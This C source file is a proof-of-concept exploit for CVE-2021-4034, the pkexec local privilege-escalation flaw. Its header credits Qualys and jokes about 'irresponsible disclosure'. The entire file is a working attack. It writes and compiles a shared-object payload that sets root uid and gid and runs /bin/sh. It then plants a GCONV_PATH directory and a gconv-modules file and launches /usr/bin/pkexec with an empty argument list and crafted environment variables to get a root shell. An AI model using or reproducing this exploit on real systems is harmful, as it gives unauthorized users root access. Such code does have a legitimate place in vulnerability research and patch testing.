/*
 * blasty-vs-pkexec.c -- by blasty <peter@haxx.in> 
 * ------------------------------------------------
 * PoC for CVE-2021-4034, shout out to Qualys
 *
 * ctf quality exploit
 *
 * bla bla irresponsible disclosure
 *
 * -- blasty // 2022-01-25
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>

void fatal(char *f) {
    perror(f);
    exit(-1);
}

void compile_so() {
    FILE *f = fopen("payload.c", "wb");
    if (f == NULL) {
        fatal("fopen");
    }

    char so_code[]=
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "void gconv() {\n"
        "  return;\n"
        "}\n"
        "void gconv_init() {\n"
        "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
        "  static char *a_argv[] = { \"sh\", NULL };\n"
        "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
        "  execve(\"/bin/sh\", a_argv, a_envp);\n"
        "  exit(0);\n"
        "}\n";

    fwrite(so_code, strlen(so_code), 1, f);
    fclose(f);

    system("gcc -o payload.so -shared -fPIC payload.c");
}

int main(int argc, char *argv[]) {
    struct stat st;
    char *a_argv[]={ NULL };
    char *a_envp[]={
        "lol",
        "PATH=GCONV_PATH=.",
        "LC_MESSAGES=en_US.UTF-8",
        "XAUTHORITY=../LOL",
        NULL
    };

    printf("[~] compile helper..\n");
    compile_so();

    if (stat("GCONV_PATH=.", &st) < 0) {
        if(mkdir("GCONV_PATH=.", 0777) < 0) {
            fatal("mkdir");
        }
        int fd = open("GCONV_PATH=./lol", O_CREAT|O_RDWR, 0777); 
        if (fd < 0) {
            fatal("open");
        }
        close(fd);
    }

    if (stat("lol", &st) < 0) {
        if(mkdir("lol", 0777) < 0) {
            fatal("mkdir");
        }
        FILE *fp = fopen("lol/gconv-modules", "wb");
        if(fp == NULL) {
            fatal("fopen");
        }
        fprintf(fp, "module  UTF-8//    INTERNAL    ../payload    2\n");
        fclose(fp);
    }

    printf("[~] maybe get shell now?\n");

    execve("/usr/bin/pkexec", a_argv, a_envp);
}
